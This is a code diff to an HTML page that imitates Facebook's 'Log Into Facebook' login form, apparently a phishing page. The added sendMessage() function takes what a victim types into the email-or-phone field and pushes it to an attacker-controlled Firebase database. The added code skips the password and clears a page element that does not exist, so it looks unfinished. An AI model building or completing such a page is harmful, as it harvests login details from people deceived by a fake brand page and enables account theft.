@@ -15,7 +15,7 @@
             <h1>Log Into Facebook</h1>
             <input type="username" id="username" placeholder="Email or phone number" name="username"><br>
             <input type="password" id="password" placeholder="password" name="password" ><br>
-            <a href="#"><input  type="submit" onclick="fn1()" name="log in"   id="btn"><br></a>
+            <a href="#"><input  type="submit" onclick="sendMessage()" name="log in"   id="btn"><br></a>
             <a href="#">Forgot account? </a><a href="">sign up</a>
         </div>
     </div>
@@ -36,9 +36,18 @@
       messagingSenderId: "318164043775",
       appId: "1:318164043775:web:4aaa785306672006f989ca"
     };
-    window.alert("ndamwishe")
+    
   
     // Initialize Firebase
     const app = initializeApp(firebaseConfig);
+    function sendMessage() {
+  const message = document.getElementById('username').value;
+  const messagesRef = ref(database, 'messages/');
+  const newMessageRef = push(messagesRef);
+  set(newMessageRef, {
+    text: message
+  });
+  document.getElementById('message').value = '';
+}
   </script>
 </html>
